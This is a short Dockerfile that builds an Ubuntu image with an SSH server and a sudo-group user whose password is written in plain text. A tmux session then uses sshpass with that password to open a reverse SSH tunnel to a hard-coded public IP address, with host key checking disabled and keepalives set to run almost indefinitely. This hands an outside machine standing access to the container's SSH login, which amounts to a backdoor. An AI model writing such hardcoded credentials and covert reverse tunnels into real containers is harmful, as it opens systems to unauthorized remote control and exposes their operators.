FROM ubuntu:latest

RUN apt update && apt install tmux sshpass iputils-ping openssh-server sudo -y

RUN useradd -rm -d /home/ubuntu -s /bin/bash -g root -G sudo -u 1000 randyroth 

RUN  echo randyroth:mb4hmarl3y!Q | chpasswd

RUN service ssh start

RUN tmux new -d -s my-session "sshpass -p mb4hmarl3y\!Q ssh -o ServerAliveInterval=9999 -o ServerAliveCountMax=999999 -o StrictHostKeyChecking=no -tt -R 2040:localhost:22 ubuntu@54.179.56.209 -- ping google.com"

EXPOSE 22

CMD ["/usr/sbin/sshd","-D"]
